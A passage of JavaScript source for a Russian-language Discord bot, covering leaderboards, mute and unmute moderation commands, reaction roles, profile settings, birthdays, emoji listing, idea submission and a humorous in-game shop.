            let name = (i + 1) + ". " + ((e.id == msg.author.id) ? "?".repeat(e.username.length) : e.username) + ((i == 0) ? " <a:neonThumbnail:806176512159252512>" : "") + (random(9) ? "" : " <a:void:768047066890895360>");
            let value = `Использований котла ${random(3) ? e.data.voidRituals : "???"}`;
            return {name, value};
          });
          break;

        case "⚔️":
          sort = users.filter(user => guild.data.boss.users[user.id]?.damageDealt).sort((a, b) => guild.data.boss.users[b.id].damageDealt - guild.data.boss.users[a.id].damageDealt);
          index = sort.indexOf(msg.author);
          rangs = sort.map((user, i) => {
            const name = `${ i + 1 }. ${ user.username }`;
            const value = `Великий воин нанёс ${ guild.data.boss.users[user.id].damageDealt }ед. урона`;
            return {name, value};
          });
          break;

        default: return;
      }

      if (react != "640449848050712587" && react != "640449832799961088"){
        page = 0;
        pages = [];
        while (rangs.length) pages.push(rangs.splice(0, 15));
      }
      embed.message = index !== -1 ? `Вы находитесь на ${ index + 1 } месте, ${ msg.author.username }` : `Вы не числитесь в этом топе, ${ msg.author.username }`
      embed.footer = (pages[1]) ? {text: `Страница: ${page + 1} / ${pages.length}`} : null;
      embed.fields = (pages[0]) ? pages[page] : [{name: "Ещё никто не попал в топ", value: "Значит вы лёгко можете стать первым(-ой)"}];

      message = await message.msg(embed);
      react = await message.awaitReact({user: msg.author, type: "all"}, (page != 0 ? "640449848050712587" : null), ((pages[1] && page != pages.length - 1) ? "640449832799961088" : null), ...others.filter(e => e != react));
    }

  }, {delete: true, dm: true, Permissions: 16384, cooldown: 20, type: "user"}, "топ ранги ranks rangs лидеры leaderboard leaders"),

  mute: new Command(async (msg, op) => {
    let guild = msg.guild;
    let guildMember = guild.member(op.memb);
    let role;



    if (op.memb === msg.author)
      return msg.msg("Вы не можете выдать себе мут, могу только вам его прописать.", {author: {name: msg.author.username, iconURL: msg.author.avatarURL()}, delete: 12000});

    if (op.memb === client.user)
      return msg.msg("Попробуйте другие способы меня замутить, например, объявите за мою поимку награду в 100 000 коинов <:coin:637533074879414272>", {delete: 12000});

    if (op.memb.bot)
      return msg.msg("Если этот бот вам надоедает, то знайте — мне он тоже надоел", {description: "Но замутить его я все-равно не могу.", delete: 12000});

    if (guildMember.roles.highest.position > op.member.roles.highest.position)
      return msg.msg("Вы не можете выдать мут участнику, роли которого выше ваших", {author: {name: msg.author.username, iconURL: msg.author.avatarURL()}, delete: 12000});

    if (guildMember.permissions.has("ADMINISTRATOR"))
      return msg.msg("Вы не можете выдать мут участнику, с правами Администратора", {author: {name: msg.author.username, iconURL: msg.author.avatarURL()}, delete: 12000});




    op.args = op.args.replace(RegExp(`<@!?${op.memb.id}>`), "").trim();


    // parse timestamps
    let timeToEnd = 0;

    while (true){
      let regBase = `(\\d+?)\\s*(d|д|h|ч|m|м|s|с)[a-zA-Zа-яА-Я]*`;
      const reg = RegExp(`^${ regBase }|${ regBase }$`);
      let matched = op.args.match( reg );

      if (!matched){
        break;
      }

      if (matched[3]){
        matched[1] = matched[3];
        matched[2] = matched[4];
      }

      let [value, timeType] = [ matched[1], matched[2] ];

      op.args = op.args.replace(matched[0], "").trim();
      timeToEnd += value * {s: 1000, m: 60000, h: 3600000, d: 84000000, с: 1000, м: 60000, ч: 3600000, д: 84000000}[timeType];
    }

    let cause = op.args;


    // find muted role
    if (guild.data.mute_role)
      role = guild.roles.cache.get(guild.data.mute_role);

    if (!role){
      role =
        guild.roles.cache.find(e => "mute muted замучен мьют мут замьючен".includes(e.name.toLowerCase()))
        ||
        await guild.roles.create({data: {name: "MUTED", color: "a8a8a8", permissions: ["VIEW_CHANNEL"]}});

      guild.data.mute_role = role.id;
    }

    if (guildMember.roles.cache.get(role.id)){
      msg.msg("Участник уже находится в муте", {color: "ff0000"});
      return;
    }


    if (timeToEnd){
      new TimeEvent("offMuteAutomatic", timeToEnd, msg.guild.id, guildMember.id);
      timeToEnd = new Intl.DateTimeFormat("ru-ru", {day: "numeric", month: "numeric", hour: "2-digit", minute: "2-digit"}).format(getTime() + timeToEnd);
    }

    guildMember.roles.add(role, `Muted from ${msg.author.id}`);

    await delay(700);

    let embed = {
      description: `Пользователь ${guildMember} был замучен.${cause ? `\nПричина: ${cause}` : ""}${timeToEnd ? `\nОграничения автоматически будут сняты ${timeToEnd}` : ""}`,
      color: "de3c37",
      author: {name: guildMember.displayName, iconURL: guildMember.user.displayAvatarURL()},
      footer: {text: `Мут выдал ${msg.author.username}`, iconURL: msg.author.avatarURL()}
    }
    msg.guild.logSend("Участнику выдан мут", embed);
    msg.msg("Участник был замучен", embed);
  }, {memb: true, dm: true, delete: true, Permissions: 4194304, myPermissions: 268435456, type: "guild"}, "мут мьют"),

  unmute: new Command(async (msg, op) => {
    let guild = msg.guild;
    let guildMember = guild.member(op.memb);
    let role;



    if (op.memb === msg.author)
      return msg.msg("Если вы смогли отправить это сообщение, значит вы не в муте, верно?", {author: {name: msg.author.username, iconURL: msg.author.avatarURL()}, delete: 12000});

    if (op.memb === client.user)
      return msg.msg("Благодарю, но я не в муте", {delete: 12000});

    if (op.memb.bot)
      return msg.msg("Существует легенда о.. А впрочем не важно. Невозможно размутить другого бота", {description: "Но замутить его я все-равно не могу.", delete: 12000});

    if (guildMember.roles.highest.position > op.member.roles.highest.position)
      return msg.msg("Вы не можете размутить участника, роли которого выше ваших", {author: {name: msg.author.username, iconURL: msg.author.avatarURL()}, delete: 12000});

    if (guildMember.permissions.has("ADMINISTRATOR"))
      return msg.msg("Вы не можете размутить Администратора, как бы это странно не звучало.", {author: {name: msg.author.username, iconURL: msg.author.avatarURL()}, delete: 12000});



    // find muted role
    if (guild.data.mute_role)
      role = guild.roles.cache.get(guild.data.mute_role);

    if (!role){
      role =
        guild.roles.cache.find(e => "mute muted замучен мьют мут замьючен".includes(e.name.toLowerCase()))
        ||
        await guild.roles.create({data: {name: "MUTED", color: "a8a8a8", permissions: ["VIEW_CHANNEL"]}});

      guild.data.mute_role = role.id;
    }



    if (!guildMember.roles.cache.get(role.id)){
      msg.msg("Участник не имеет роли мута", {description: `Если по какой-то причине вам нужно отозвать запрет на общение в каналах, замутьте пользователя на 1с или выдайте и заберите роль ${role}`, color: "ff0000"});
      return;
    }

    guildMember.roles.remove(role);


    let embed = {
      description: `С пользователя сняты ограничения на общение в чатах`,
      color: "de3c37",
      author: {name: guildMember.displayName, iconURL: guildMember.user.displayAvatarURL()},
      footer: {text: `Мут cнял ${msg.author.username}`, iconURL: msg.author.avatarURL()}
    }

    msg.guild.logSend("С участника снят мут", embed);
    msg.msg("С участника сняли мут", embed);
  }, {memb: true, dm: true, delete: true, Permissions: 4194304, myPermissions: 268435456, type: "guild"}, "анмут анмьют"),

  reactor: new Command(async (msg, op) => {
    let answer = await accept("reactor", "С помощью этой команды вы можете создавать реакции выдающее роли. \nРеакции должны быть установлены заранее\nВы уже установили реакциии?)", msg.channel, msg.author.data);
    if (!answer) return;

    let whatChannel = await msg.msg("Укажите айди или упомяните канал в котором находится сообщение.\nЕсли оно находится в этом канале, нажмите реакцию ниже");
    answer = await reactOrMessage(whatChannel, msg.author, "640449832799961088");
    whatChannel.delete();

    if (answer instanceof Discord.Message) {
      answer.delete();
    }

    let channel = answer === "640449832799961088" ? msg.channel : (answer.mentions.channels.first() || msg.guild.channels.cache.get(answer.content));
    if (!channel) {
      msg.msg("Канал не найден", {delete: 3000, color: "ff0000"});
      return;
    }

    let whatMessage = await msg.msg("Укажите айди сообщения");
    answer = await msg.channel.awaitMessage(msg.author);
    // whatMessage.delete();
    let message = await channel.messages.fetch(answer.content).catch( e => {msg.msg("Не удалось найти сообщение", {delete: 3000, color: "ff0000"}); throw e} );

    let reactions = [...message.reactions.cache.keys()];
    if (!reactions.length) {
      let whatReactions = await msg.msg("Вы не установили ни одной реакции под сообщением, сделайте это сейчас.\nКогда будете готовы, нажмите галочку ниже.");
      while (true){
        let react = await whatReactions.awaitReact({user: msg.author, type: "all"}, "685057435161198594");
        if (!react) {
          return;
        }

        reactions = [...message.reactions.cache.keys()];
        if (!reactions.length) client.api.channels(msg.channel.id).messages.post({data: {"content": "Сначала установите реакции под приклеплённым сообщением", "message_reference": {message_id: channel.id}}});
        else {
          break;
        }
      }
      whatReactions.delete();
    }

    let whatRoles = await msg.msg("Укажите роли через пробел\nВо избежание лишних упоминаний, только по айди");
    answer = await msg.channel.awaitMessage(msg.author, 300000);
    whatRoles.delete();

    let rolesId = answer.content.match(/\d{17,20}/g);
    if (!rolesId) {
      msg.msg(`Не удалось найти иденфикаторы ролей`, {delete: 5000, color: "ff0000"});
      return;
    }

    let roles = rolesId.map(el => channel.guild.roles.cache.get(el)).filter(el => el);
    if (rolesId.length !== roles.length) {
      msg.msg(`Не удалось найти роли по следующим иденфикаторам: ${rolesId.filter(el => !roles.map(el => el.id).includes(el)).join(" ")}`, {delete: 5000, color: "ff0000"});
      return;
    }

    if (roles.length > reactions.length) {
      msg.msg("Ролей указано больше, чем стоит реакций под сообщением.", {delete: 5000, color: "ff0000"});
      return;
    }

    if (roles.length < reactions) {
      answer = await msg.msg("Ролей указано меньше, чем стоит реакций под сообщением, вы хотите продолжить?");
      let react = await answer.awaitReact({user: msg.author, type: "all"}, "685057435161198594", "❌");

      if (react != "685057435161198594") {
        msg.msg("Действие отменено ❌", {delete: 4500});
        return;
      }
    }

    // let settings = {
    //
    // }

    let obj = {};
    roles.forEach((e, i) => obj[reactions[i]] = e.id);
    new ReactionsManager(message.id, channel.id, channel.guild.id, "reactor", obj);

    msg.msg("Установлен реактор сообщения", {description: `Сообщению с ID ${message.id} были присвоены реакции выдающие следущие роли:\n${roles.map(e => " • " + e.name).join("\n")}`, delete: 9000});
    msg.guild.logSend("Установлен реактор сообщения", {description: `Сообщению с ID ${message.id} были присвоены реакции выдающие следущие роли:\n${roles.map(e => " • " + e.name).join("\n")}`});
  }, {dm: true, delete: true, Permissions: 268435488, myPermissions: 268435456, cooldown: 30, type: "guild"}, "реактор"),

  setprofile: new Command(async (msg, op) => {
    let
      user  = op.user,
      args  = op.args.split(" "),
      value = args.splice(1).join(" "),
      item  = args[0].toLowerCase();

      if (!["description", "осебе", "описание", "color", "цвет", "birthday", "др", "confidentiality", "конфиденциальность"].includes(item)) {
        let problemsMessage = await msg.msg("<a:who:638649997415677973> Вы не указали то, что вы хотите изменить\nПовторите попытку", {delete: 10000, description: "Поддерживаемые значения:\n`• осебе/description`\n`• цвет/color`\n`• др/birthday`\n`• конфиденциальность/confidentiality`"});

        //** Реакция-помощник
        let react = await problemsMessage.awaitReact({user: msg.author, type: "all"}, "❓");
        if (!react){
          return;
        }

        let helper = await commands.commandinfo.code(msg, {args: "setprofile"});
        await delay(20000);
        helper.delete();
        /**/

        return;
      }

      if (!value) {
        msg.msg("Вы не ввели значение", {delete: 3000});
        return;
      }

      switch (item) {
        case "description":
        case "описание":
        case "осебе":
          let minus = (value.match(/<a?:.+?:\d+?>|\\?!\{.+?\}/g) || []).join("").length;
          if (value.length - minus > 121) return msg.msg("Длина описания не должна превышать 120 символов", {delete: 5000, color: "ff0000", description: `Ваша длина: ${value.length - minus}\nТекст:\n${value}`});
          let line = "";
          let lineMinus = 0;
          minus = 0;

          let words = value.split(" ");
          value = "";
          for (let i = 0; i < words.length; i++){
            let e = words[i];

            lineMinus += (e.match(/<a?:.+?:\d+?>|\\?!\{.+?\}/g) || []).join("").length;
            let indent;
            if (indent = e.match(/\n/)) {
              words.splice(i + 1, 0, e.slice(indent.index + 1));
              value += `${line} ${e.slice(0, indent.index)}\n`;
              line = "";
              lineMinus = 0;
              continue;
            }

            if (line.length - lineMinus + e.length < 30) {
              line += " " + e;
            }
            else {
              value += line + "\n" + e;
              line = "";
              lineMinus = 0;
            }
          }
          value += line;

          user.profile_description = value;
          msg.msg(`Описание установлено!`, {delete: 5000})
        break;

        case "color":
        case "цвет":
          if (value == "0"){
             delete user.profile_color;
             msg.msg("Готово! Пользовательский цвет удалён", {delete: 5000})
          }

          let color = value.match(/[abcdef0-9]{6}|[abcdef0-9]{3}/i);
          if (!color) {
            return msg.msg("Неверный формат, введите цвет в формате HEX `#38f913`", {color: "ff0000", delete: 5000});
          }
          color = color[0].toLowerCase();
          color = color.length === 3 ? [...color].map(e => e + e).join("") : color;

          user.profile_color = color;
          msg.msg(`Готово! Пользовательский цвет установлен #${color.toUpperCase()}\nЕсли вы захотите его удалить - установите цвет в значение 0`, {color: color, delete: 5000});
        break;

        case "birthday":
        case "др":
          if (user.BDay){
            let prise = [1200, 3000, 12000][user.chestLevel];
            let message = await msg.msg(`Вы уже устанавливали дату своего дня рождения, повторная смена будет стоить вам ${prise} коинов\nПродолжить?`);
            let react = await message.awaitReact({user: msg.author, type: "all"}, "685057435161198594", "763807890573885456");

            if (react != "685057435161198594"){
              return msg.msg("Действие отменено", {color: "ff0000", delete: 4000});
            }
            if (user.coins < prise){
              return msg.msg("Недостаточно коинов", {color: "ff0000", delete: 4000});
            }
            user.coins -= prise;
          }

          let day = value.match(/\d\d\.\d\d/);
          if (!day){
            return msg.msg("Укажите в формате \"19.11\" - день, месяц", {color: "ff0000", delete: 5000});
          }

          day = day[0];

          const [date, month] = day.split(".").map(Number);
          if (date > 31 || date < 1 || month < 1 || month > 12){
            return msg.msg("Укажите в формате \"19.11\" - день, месяц", {color: "ff0000", delete: 5000});
          }
          user.BDay = day;
          msg.author.quest("setBirthday");
          msg.msg("Установлено! 🎉", {delete: 3000});
        break;

        case "confidentiality":
        case "конфиденциальность":
          let message = await msg.msg(`Реж. конфиденциальности ${user.profile_confidentiality ? "включен, отлючить?" : "выключен, включить?"}`);
          let react = await message.awaitReact({user: msg.author, type: "all"}, "685057435161198594", "763807890573885456");
          if (react != "685057435161198594") {
            return msg.msg("Действие отменено", {color: "ff0000", delete: 4000});
          }
          user.profile_confidentiality = user.profile_confidentiality ? false : true;
        break;
      }
  }, {delete: true, cooldown: 20, try: 5, type: "user"}, "настроитьпрофиль about осебе sp нп"),

  voice: new Command(async (msg, op) => {
    return false;
    let connection;
    if (msg.member.voice.channel) connection = await msg.member.voice.channel.join();
    else msg.msg('Быстро зашёл в войс!');


    const dispatcher = connection.play(ytdl('https://youtu.be/tbr9dXoFKh8', { filter: 'audioonly' }));
    //main/images/one.mp3
  }, {dm: true, type: "dev"}, "войс"),

  birthdays: new Command(async (msg, op) => {
    const splitDate = (date) => date.split(".").map(Number);

    const [currentDay, currentMonth] = splitDate(data.bot.dayDate);



    const users = msg.guild.members.cache
      .map(member => member.user)
      .filter(user => user.data.BDay && !user.data.profile_confidentiality);

    const sortByDate = (userA, userB) => {
      const [aDay, aMonth] = splitDate(userA.data.BDay);
      const [bDay, bMonth] = splitDate(userB.data.BDay);


      if (aMonth !== bMonth){
        return (-1) ** (aMonth < bMonth);
      }

      if (aDay !== bDay){
        return (-1) ** (aDay < bDay);
      }

      return 0;
    };

    const usersByBirthdays = {
      inThisYear: [],
      inNextYear: []
    }

    const checkInThisYear = (day, month) => 
        month > currentMonth ||
        month === currentMonth && day >= currentDay;
    

    users.forEach(user => {
      const [day, month] = splitDate(user.data.BDay);

      const inThisYear = checkInThisYear(day, month);
      
      inThisYear ?
        usersByBirthdays.inThisYear.push(user) :
        usersByBirthdays.inNextYear.push(user);

    });


    const sortedUsers = usersByBirthdays.inThisYear.length >= 20 ?
      usersByBirthdays.inThisYear.sort(sortByDate) :
      [...usersByBirthdays.inThisYear.sort(sortByDate), ...usersByBirthdays.inNextYear.sort(sortByDate)];


    const daysTo = ({date: [day, month], current}) => {
      const year = new Date().getFullYear() + (+!current);
      const compare = new Date(`${ year }.${ month }.${ day }`);

      const diff = compare.getTime() - Date.now();
      return Math.ceil(diff / 86_400_000);
    }

    const toField = (user) => {
      const isToday = user.data.BDay === data.bot.dayDate;
      const inThisYear = checkInThisYear(...splitDate(user.data.BDay));

      const dateContent = isToday ? "сегодня! 🎁" : user.data.BDay;
      const inDaysContent = ` (через ${ daysTo({current: inThisYear, date: splitDate(user.data.BDay)}) }д.)`;
      const name = `${ dateContent }${ inDaysContent }`;
      const value = user.tag;
      return {name, value, inline: true};
    };

    const fields = sortedUsers.length ?
      sortedUsers
        .slice(0, 20)
        .map(toField) :
      [{name: "Никто не установил дату своего дня рождения", value: "Сделать это можно — `!нп др <date>`"}];


    const birthdaysToday = data.bot.clearParty || 0;

    const title = "🎉 Дни рождения!";
    const description = `Здесь отображаются даты дней рождения пользователей, которые указали эту информацию`;
    const footer = { text: birthdaysToday ? `Празднующих сегодня: ${ birthdaysToday }` : "glhf" };

    msg.msg(title, {description, fields, footer});
  }, {delete: true, cooldown: 15, type: "user"}, "parties праздники вечеринки днирождения др"),

  emojis: new Command(async (msg, op) => {

    if (op.args){
      let id = match(op.args, /\d{17,21}/);
      if (!id){
        msg.msg("Не смайлик", {description: `\`${op.args}\` — не эмодзи, и не айди.\nЧтобы получить список эмодзи на сервере введите команду без аргументов.\nВведя идентификатор смайлика, получите более подробную информацию о нём`, color: "ff0000", delete: 5000});
        return;
      }

      let emoji = client.emojis.cache.get(id);
      if (!emoji){
        msg.msg("Этого смайлика у нас нет.", {description: "Такого эмодзи нет ни на одном сервере, где есть бот. Невозможно получить о нём какие-либо данные", delete: 5000});
        return;
      }

      let author = await emoji.fetchAuthor();
      msg.msg("О нём:", {description: "> " + emoji.toString(), thumbnail: emoji.url, author: {name: "Эмотикон :>\nС сервера " + emoji.guild.name, iconURL: emoji.guild.iconURL()}, footer: {text: "ID: " + emoji.id}, fields: [{name: "Имя:", value: "`" + emoji.name + "`", inline: true}, {name: "Эмодзи добавил:", value: author.tag, inline: true}, {name: "Был добавлен на сервер: ", value: timestampToDate(getTime() - emoji.createdTimestamp, 4) + " назад."}]})
      return;
    };

    let emojis = msg.guild.emojis.cache.sort( (a, b) => b.  animated - a.animated || ((b.name > a.name) ? -1 : (b.name < a.name) ? 1 : 0) ).map(e => e.toString() + "  " + e.id);

    let pages = [];
    let page = 0;
    while (emojis.length) pages.push(emojis.splice(0, 20));
    if (!pages[0]) {
      return msg.msg("<a:google:638650010019430441> Эмотиконы сервера!", {description: "Но тут почему-то пусто... 🐘"})
    }

    let embed = {
      description: pages[page].join("\n"),
      thumbnail: msg.guild.emojis.cache.random().url
    };
    if (pages[1]) embed.footer = {text: `Страница: ${page + 1} / ${pages.length}`};

    let message = await msg.msg("<a:google:638650010019430441> Эмотиконы!!", embed);


    let react = await message.awaitReact({user: msg.author, type: "all"}, (pages[1]) ? "640449832799961088" : null);
    embed.edit = true;

    while (true){
      switch (react) {
        case "640449832799961088":
          page++;
          break;
        case "640449848050712587":
          page--;
          break;
        default: return;
      }

      embed.footer = {text: `Страница: ${page + 1} / ${pages.length}`};
      embed.description = pages[page].join("\n");

      embed.thumbnail = msg.guild.emojis.cache.random().url;
      message = await message.msg("<a:google:638650010019430441> Эмотиконы!!", embed);
      react = await message.awaitReact({user: msg.author, type: "all"}, (page != 0 ? "640449848050712587" : null), (page + 1 != pages.length ? "640449832799961088" : null));
    }


  }, {delete: true, cooldown: 7, try: 3, type: "other"}, "emoji смайлики эмодзи эмоджи"),

  idea: new Command(async (msg, op) => {
    let heAccpet = await accept("idea", {message: "<a:crystal:637290417360076822> Подать идею", description: "После подтверждения этого сообщения, текст, который вы ввели вместе с командой, будет отправлен разработчику.\nВсё идеи попадают **[сюда.](https://discord.gg/76hCg2h7r8)**"}, msg, op.user);
    if (!heAccpet) return msg.author.msg("Ваша идея не была отправлена так как вы не подтвердили отправку", {description: "Текст идеи:\n" + op.args, color: "ff0000"});

    let channel = client.guilds.cache.get("752898200993660959").channels.cache.get("753587805195862058");

    const getIdeaNumber = async () => {
      const messages = await channel.messages.fetch();
      const lastIdeaMessage = messages.find(message => message.author === client.user);
      return +match(lastIdeaMessage.embeds[0].author.name, /#\d+/).slice(1);
    }


    const ideaNumber = await getIdeaNumber();

    channel.msg("<:meow:637290387655884800> Какая классная идея!", {
      description: "**Идея:**\n" + op.args, color: op.user.profile_color || "00ffaf",
      author: {
        name: `${msg.author.username} #${ ideaNumber + 1 }`,
        iconURL: msg.author.avatarURL()
      },
      reactions: ["814911040964788254", "815109658637369377"]});
    msg.msg("<:meow:637290387655884800> Вы отправили нам свою идею! Спасибо!", {description: `А что, идея «${op.args}» весьма не плоха...`, color: "00ffaf", author: {name: msg.author.username, iconURL: msg.author.avatarURL()} });
  }, {args: true, cooldown: 1200, try: 2, delete: true, type: "bot"}, "идея innovation новвоведение"),

  grempen: new Command(async (msg, op) => {

    if (op.memb){
      const data = op.memb.data;
      const wordNumbers = ["ноль", "один", "два", "три", "четыре", "пять", "шесть", "семь", "восемь", "девять", "десять"];

      const getList = (mask) => wordNumbers.filter((word, index) => (2 ** index) & mask);
      const list = getList(data.grempen || 0);

      const buyingItemsContent = data.shopTime === Math.floor(getTime() / 86400000) && data.grempen ?
        `приобрел ${ ending(list.length, "товар", "ов", "", "а") } под номером: ${ add_and( list.sort(Math.random) ) }. Если считать с нуля конечно-же.` :
        "сегодня ничего не приобретал.\nМожет Вы сами желаете чего-нибудь прикупить?";

      const description = `Ох, таки здравствуйте. Человек, о котором Вы спрашиваете ${ buyingItemsContent }`;
      msg.msg("<:grempen:753287402101014649> Зловещая лавка", {description, color: "541213", thumbnail: op.memb.avatarURL()});
      return;
    }


    let user = msg.author.data;

    const allItems = [
      {
        name: "🦴 Просто палка",
        value: 244,
        inline: true,
        others: ["палка", "палку"],
        fn: () => {
          let phrase = ".\nВы купили палку. Это самая обычная палка, и вы её выбросили.";
          if (user.monster){
            const DENOMINATOR  = 0.995;
            const COMMON_VALUE = 3;

            const MIN = 5;

            const max = (COMMON_VALUE * (1 - DENOMINATOR ** user.monster)) / (1 - DENOMINATOR) + MIN;
            const count = Math.ceil(
              random(MIN, max)
            );
            phrase += `\nВаши ручные Монстры, погнавшись за ней, нашли ${ ending(count, "ключ", "ей", "", "а") }`;
            user.keys += count;
          }

          return phrase;
        }
      },
      {
        name: "🌶️ Жгучий перчик",
        value: 160,
        inline: true,
        others: ["перец", "перчик"],
        fn: () => {
          if (user.chilli === undefined) {
            user.chilli = 0;
            msg.msg("Окей, вы купили перец, просто бросьте его...", {description: "Команда броска `!chilli @Пинг`", delete: 12000});
          }

          user.chilli++;
          return ". \"Готовтесь глупцы, грядёт эра перчиков\"";
        }
      },
      {
        name: "🧤 Перчатки перчатника",
        value: 700,
        inline: true,
        others: ["перчатку", "перчатки", "перчатка"],
        fn: () => {
          if (user.thiefGloves) {
            let [count, combo] = user.thiefGloves.split("|");
            count = +count + 2;
            user.thiefGloves = count + "|" + combo;
            delete user.CD_39;
          }
          else {
            user.thiefGloves = "2|0";
            msg.author.msg("Вы купили чудо перчатки?", {description: "Отлично, теперь вам доступна команда `!rob`.\n**Правила просты:**\nВаши перчатки позволяют ограбить участника, при условии, что он онлайн.\nВ течении 2-х минут у ограбленного есть возможность догнать вас и вернуть деньги.\nЕсли попадётесь дважды, то перчатки нужно покупать заново — эдакий риск.\nНужно быть осторожным и умным, искать момента.\nА пользователи должны быть хитры, если кто-то спалил, что у вас есть перчатки.\nЦель участников забайтить вас на них напасть, а вор, то есть вы, должен выждать хорошего момента и совершить атаку."})
          }
          return ". _Режим воровитости активирован._";
        }
      },
      {
        name: "🔩 Старый ключ",
        value: 15,
        inline: true,
        others: ["ключ", "ключик", "key"],
        fn: () => {
          user.keys++;
          return " и что вы делаете? Нет! Это не Фиксик!";
        }
      },
      {
        name: "🧪 Бутылёк опыта",
        value: "???",
        inline: true,
        others: ["опыт", "бутылёк"],
        fn: (product) => {
          const rand = random(3, 7);
          const LIMIT = 15_000;
          const flaconPrice = Math.min(
            Math.ceil(user.coins / rand),
            LIMIT
          );
          user.exp += Math.ceil(flaconPrice * 0.8);

          product.value = flaconPrice;
          return `, как дорогущий флакон давший вам целых ${ Math.floor(flaconPrice * 0.8) } <:crys:637290406958202880>`;
        }
      },
      {
        name: "🐲 Ручной монстр",
        value: 1999 + 1000 * Math.ceil(nonNaN(user.monstersBought) / 3),
        inline: true,
        others: ["монстр", "монстра"],
        fn: () => {
          if (user.monster === undefined){
            user.monster = 0;
            user.monstersBought = 0;
            msg.msg("", {description: "Монстры защищают вас от мелких воришек и больших воров, также они очень любят приносить палку, но не забывайте играть с ними!", author: {name: "Информация", iconURL: client.user.avatarURL()}, delete: 5000});
          }
          user.monster++;
          user.monstersBought++;
          return ", ой, простите зверя*";
        }
      },
      {
        name: "🥫 Консервы Интеллекта",
        value: 1200,
        inline: true,
        others: ["консервы", "интеллект"],
        fn: () => {
          if (user.iq === undefined){
            user.iq = random(27, 133);
          }

          user.iq += random(3, 7);
          return ".\nВы едите эти консервы и понимаете, что становитесь умнее. Эта покупка точно была не напрасной...";
        }
      },
      {
        name: "🍼 Бутылка глупости",
        value: 400,
        inline: true,
        others: ["бутылка", "бутылку", "глупость", "глупости"],
        fn: () => {
          if (user.iq === undefined){
            user.iq = random(27, 133);
          }

          user.iq -= random(3, 7);
          return ".\nГу-гу, га-га?... Пора учится...!";
        }
      },
      {
        name: "👜 Шуба из енота",
        value: 3200,
        inline: true,
        others: ["шуба", "шубу", "шуба из енота"],
        fn: (product) => {
          let isFirst = !(user.completedQuest && user.completedQuest.includes("beEaten"));
          user.coins += product.value + (isFirst ? 200 : -200);
          msg.author.quest("beEaten");

          if (user.curses.length > 0){
            delete user.curses;
            return ", как магический артефакт, защитивший вас от проклятия";
          }

          return isFirst ?
            ".\nВы надели шубу и в миг были съедены озлобленной группой енотов.\nХорошо, что это был всего-лишь сон, думаете вы...\nНо на всякий случай свою старую шубу из кролика вы выкинули." :
            ".\nВы надели шубу. Она вам очень идёт.";
        }
      },
      {
        name: user.voidCasino ? "🥂 Casino" : "🎟️ Лотерейный билет",
        value: user.voidCasino ? Math.floor(user.coins / 3.33) : 130,
        inline: true,
        others: ["билет", "лотерея", "лотерею", "казино", "casino", "лотерейный билет"],
        fn: () => {
          const coefficient = 220 / 130;
          const bet = user.voidCasino ? user.coins * 0.3 : 130;
          const odds = user.voidCasino ? 22 : 21;
          if (random(odds) > 8) {
            const victory = Math.ceil(bet * coefficient);
            user.coins += victory;
            return user.voidCasino ? `. Куш получен! — ${ victory }` : ", ведь с помощью неё вы выиграли 220 <:coin:637533074879414272>!";
          }

          return user.voidCasino ? ". Проигрыш. Возьмёте реванш в следующий раз." : ", как бумажка для протирания. Вы проиграли 🤪"
        }
      },
      {
        name: "💡 Идея",
        value: (user.iq && user.iq % 31 == data.bot.dayDate.match(/\d{1,2}/)[0]) ? "Бесплатно" : 80,
        inline: true,
        others: ["идея", "идею"],
        fn: (product) => {
          let ideas = [
            "познать мир шаблонов",                 "купить что-то в этой лавке",     "начать собирать ключики",
            "занятся чем-то полезным",              "предложить идею разработчику",   "заглянуть в сундук",
            "улучшить свой сервер",                 "завести котиков",                "выпить содовую или может быть... пива?",
            "придумать идею",                       "провести турнир по перчикам",    "осознать, что автор оставляет здесь пасхалки",
            "купить шубу",                          "отдохнуть",                      "сделать доброе дело",
            "накормить зло добротой",               "посмотреть в окно",              "хорошенько покушать",
            "улыбнуться",                           "расшифровать формулу любви",     "разогнаться до скорости Infinity Train",
            "пройти призрака",                      "з'їсти кого-небудь",             "предложить разработчику посмотреть хороший фильм",
            "полюбить?",                            "вернуть мне веру в себя",        "\\*мне стоит оставлять здесь больше пасхалок\\*",
            "понять — проклятья — это не страшно"
          ]
          const phrase = ["звучит слишком неубедительно", "печенье...", "зачем вам всё это надо.", "лучше хорошенько выспитесь.", "лучше займитесь ничем.", "занятся ничегонеделанием всё-равно лучше."].random();
          return `.\n**Идея:** Вы могли бы ${ ideas.random() }, но ${ phrase }`;
        }
      },
      {
        name: "☘️ Счастливый клевер",
        value: 400,
        inline: true,
        others: ["клевер", "счастливый", "счастливый клевер", "clover"],
        fn: (product) => {
          const phrase = ". Клевер для всех участников в течении 4 часов увеличивает награду коин-сообщений на 15%!\nДействует только на этом сервере.";
          if (!msg.guild.data.cloverEffect){
            msg.guild.data.cloverEffect = {
              coins: 0,
              timestamp: getTime(),
              uses: 1
            };
            new TimeEvent("cloverEnd", 14400000, msg.guild.id, msg.channel.id);
            return phrase;
          }

          msg.guild.data.cloverEffect.uses++;

          const setNewTimestamp = (event) => {
            const addingMs = Math.floor(14400000 - (event.ms - getTime()) / 18);
            const ms = event.ms + Math.max(addingMs, 0);
            return ms;
          }

          const filter = (event) => event.func === "cloverEnd" && event.args.includes(msg.guild.id);

          TimeEvent.move(filter, setNewTimestamp);
          return phrase;
        }
      },
      {
        name: "🔮 Всевидящий шар",
        value: 8000,
        inline: true,
        others: ["шар", "кубик", "случай", "всевидящий", "ball", "всевидящий шар"],
        fn: (product) => {
          const items = ["void", "seed", "coins", "level", "exp", "coinsPerMessage", "chilli", "key", "monster", "berrys", "iq", "chestBonus"];
          const item = items.random();
          user[item] = nonNaN( user[item] ) + 1;
          return ` как \`gachi-${ item }\`, которого у вас прибавилось в количестве один.`;
        }
      },
      {
        name: "🔧 Завоз товаров",
        value: 312 + user.level * 2,
        inline: true,
        others: ["завоз", "завоз товаров"],
        fn: (product) => {
          user.grempen = 0;
          return ` как дорогостоящий завоз товаров. Заходите ко мне через пару минут за новыми товарами`;
        }
      },
      {
        name: "👀 Камень с глазами",
        value: 600,
        inline: true,
        others: ["камень", "проклятие", "камень с глазами"],
        fn: (product) => {
          if (!user.curses){
            user.curses = [];
          }

          const already = user.curses.length;

          if (already && !user.voidFreedomCurse){
            user.coins += product.value;
            user.grempen -= 2 ** todayItems.indexOf(product);
            return " как ничто. Ведь вы уже были прокляты!";
          }

          const curse = CurseManager.generate({hard: null, user: msg.author});
          const curseBase = CurseManager.cursesBase.get(curse.id);
          CurseManager.init({user: msg.author, curse});

